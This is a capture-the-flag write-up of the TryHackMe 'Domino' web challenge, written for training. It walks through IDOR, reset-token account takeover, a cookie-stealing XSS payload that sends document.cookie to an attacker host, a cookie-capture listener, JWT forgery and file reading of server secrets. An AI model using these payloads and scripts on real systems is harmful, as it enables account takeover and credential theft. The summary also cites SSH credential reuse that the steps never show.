# TryHackMe - Domino | Beginner Write-Up

## What is this?

This is a web hacking challenge. We are attacking a fake company website called **NexusCorp**. The goal is to find hidden flags by exploiting security mistakes in the website.

Think of it like this: the website has doors that should be locked, but the developers forgot to lock some of them. Our job is to find those unlocked doors.

---

## Step 1 — Finding What's on the Website

Before we attack anything, we need to know what pages and files exist on the website. We use a tool called **ffuf** to automatically try thousands of common page names and see which ones exist.

```bash
ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt \
     -u http://10.x.x.x/FUZZ -e .php,.txt
```

**What this does:** It replaces `FUZZ` with words from a wordlist (like `admin`, `login`, `backup`, etc.) and checks if the page exists.

**What we found:**
- `/admin/` — the admin panel
- `/api/reset.php` — a page to reset passwords
- `/api/users/profile.php` — a page that shows user profiles
- `/api/auth/token.php` — a page that gives out login tokens
- `/api/files.php` — a page that reads files from the server
- `/support/create.php` — a page to submit support tickets
- `/backup/` — a folder with backup files (this shouldn't be public!)

---

## Step 2 — Flag 1: Accessing Someone Else's Profile (IDOR)

When we logged in as a normal user, our profile was at:
```
/api/users/profile.php?id=7
```

The `id=7` means "show me user number 7". 

**The question we asked:** What happens if we change `7` to `1`?

```bash
curl "http://10.x.x.x/api/users/profile.php?id=1" \
  -b "nexus_session=<our_cookie>"
```

The server gave us the admin's profile — including the first flag!

```json
{"id":1,"username":"laura.hayes","role":"admin","notes":"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"}
```

**Why this worked:** The server never checked if we were *allowed* to view user 1. It just showed us whatever ID we asked for. This is called **IDOR (Insecure Direct Object Reference)**.

**Real world analogy:** Imagine a bank website where your account page is at `/account?id=1234`. If you change `1234` to `1235` and see someone else's account — that's IDOR.

By going through IDs 1 to 7 we found all users:

| ID | Username | Role |
|----|----------|------|
| 1 | laura.hayes | **admin** |
| 2 | michael.chen | user |
| 3 | sarah.johnson | user |
| 4 | robert.wilson | user |
| 5 | emma.taylor | user |
| 6 | david.brown | user |
| 7 | james.wright | user |

---

## Step 3 — Taking Over a User Account (Password Reset)

We found a password reset API. Let's see what happens when we request a reset for a user:

```bash
curl -X POST http://10.x.x.x/api/reset.php \
  -H "Content-Type: application/json" \
  -d '{"username":"james.wright"}'
```

**Response:**
```json
{
  "token": "e8cb68ebc2a4b88bbc154bade54f74d1",
  "reset_url": "/reset.php?token=e8cb68ebc2a4b88bbc154bade54f74d1"
}
```

The server gave us the reset token **directly in the response**! Normally this token should only be sent to the user's email. We can now set a new password for james.wright:

```bash
curl -X POST "http://10.x.x.x/reset.php?token=e8cb68ebc2a4b88bbc154bade54f74d1" \
  -d "username=james.wright&password=hellohello"
```

We did the same for other users like `michael.chen` and `emma.taylor` to get their sessions.

**Why this worked:** The reset token is a secret key that proves you own the account. Exposing it in the API response is like a locksmith handing you a key copy when you just asked "how do I get in?".

> **Note:** The admin account `laura.hayes` was protected — it returned a different message without exposing the token. We needed a different approach for her.

---

## Step 4 — Finding the Backup Files

We found `/backup/` was publicly accessible. Inside were two files:

**README.txt said:**
```
config.enc - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js
```

We grabbed `static/app.js` and found the encryption key hidden in a comment:
```javascript
// Key: N3xusK3y2024!!  (pad to 16 bytes)
```

We wrote a short Python script to decrypt `config.enc`:

```python
from Crypto.Cipher import AES

# AES-128 needs exactly 16 bytes. The key is 14 chars so we add 2 null bytes
key = b'N3xusK3y2024!!\x00\x00'

with open('config.enc', 'rb') as f:
    data = f.read()

cipher = AES.new(key, AES.MODE_ECB)
print(cipher.decrypt(data).decode())
```

**Result:**
```json
{"app_name":"NexusCorp Portal","system_user":"devops"}
```

We also noticed in `app.js` that the admin bot would auto-fetch URLs — more on this below.

---

## Step 5 — Flag 2: Stealing the Admin's Session Cookie

The support ticket system lets users submit tickets that an admin reviews. We assumed an automated bot reviews the tickets.

**Our first attempts (that failed):** We tried submitting JavaScript payloads like:
```html
<img src=x onerror="fetch('http://our_ip:8000/?c='+document.cookie)">
```

We kept getting requests back but with **empty** values. After a lot of debugging we discovered why.

**The big discovery:** The "admin" reviewing tickets is not a real browser — it's a **Python script** using the `requests` library. We could see this in the server logs:
```
User-Agent: python-requests/2.31.0
```

Python scripts don't run JavaScript. They just fetch URLs they find in text. So we submitted a ticket with just our IP address as the message:

```
http://192.168.130.142:8000
```

We had a listener running on port 8000:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def _log(self):
        print(f"\n--- {self.command} {self.path} ---")
        for key, value in self.headers.items():
            print(f"  {key}: {value}")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK\n")
    do_GET = do_POST = do_OPTIONS = _log

HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
```

When the bot reviewed the ticket it fetched our URL and we captured its session cookie:

```
Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==...
```

Decoding the base64 part confirmed it was the admin:
```json
{"user_id": 1, "username": "laura.hayes", "role": "admin"}
```

**Why this worked:** The bot fetched any URL in a ticket without checking if it was an internal or external URL. By making it fetch our server, it leaked its own cookie. This is similar to **SSRF (Server Side Request Forgery)**.

---

## Step 6 — Getting a JWT Token as Admin

Now that we had the admin's session cookie, we used it to get a **JWT (JSON Web Token)**. Think of a JWT as a special pass that proves who you are to the API.

```bash
curl http://10.x.x.x/api/auth/token.php \
  -b "nexus_session=<admin_cookie>"
```

**Response:**
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","note":"Use as: Authorization: Bearer <token> for /api/files.php"}
```

But there was a bug — the token said `"role":"user"` even for the admin. The code always set the role to "user" regardless of who was logged in.

---

## Step 7 — Forging an Admin JWT

A JWT has three parts separated by dots:
```
header.payload.signature
```

The payload is just **base64 encoded** — easy to read and modify. The signature is supposed to prevent tampering. But when we read the source code later, we found the signature check was **disabled**:

```php
// Signature check intentionally disabled
// if (!hash_equals($parts[2], $expected)) return null;
```

This meant we could change the payload to say `"role":"admin"` and the server would accept it. We forged a token with a Python script:

```python
import hmac, hashlib, base64, json

header  = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({
    "sub": "laura.hayes",
    "role": "admin",        # <-- this is what we changed
    "iat": 1779921582,
    "exp": 9999999999
}).encode()).rstrip(b'=').decode()

# Any secret works since verification is disabled
secret = 'anything'
sig = hmac.new(secret.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()
token = f'{header}.{payload}.{base64.urlsafe_b64encode(sig).rstrip(b"=").decode()}'
print(token)
```

---

## Step 8 — Reading Server Files

With the forged admin JWT we could access `/api/files.php` which reads files from the server:

```bash
curl "http://10.x.x.x/api/files.php?name=/var/www/html/config.php" \
  -H "Authorization: Bearer <forged_token>"
```

**`config.php` contained passwords and secrets:**
```php
define('DB_PASS',    'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
```

We also read `/var/www/html/admin/index.php` which contained **Flag 2** hardcoded in the source:

```
Flag 2: THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
```

---

## Flags Summary

| Flag | Where | Vulnerability |
|------|-------|---------------|
| Flag 1 | `/api/users/profile.php?id=1` | IDOR |
| Flag 2 | `/var/www/html/admin/index.php` source | Session hijacking + JWT forgery + File read |

---

## What We Learned

| Concept | What it means |
|---------|---------------|
| **IDOR** | Changing an ID in a URL to access someone else's data |
| **Token exposure** | Reset tokens should never appear in API responses |
| **SSRF/Bot abuse** | Bots that fetch URLs can leak their own session if not restricted |
| **JWT forgery** | If signature verification is disabled, anyone can forge a token |
| **Sensitive file exposure** | Config files with passwords should never be readable via an API |
| **Credential reuse** | The same password was used for the database and SSH |

---

## Tools Used

| Tool | What it does |
|------|--------------|
| `ffuf` | Finds hidden pages and files on a website |
| `curl` | Makes HTTP requests from the command line |
| `python3` | Used for decrypting files, running a listener, and forging JWTs |
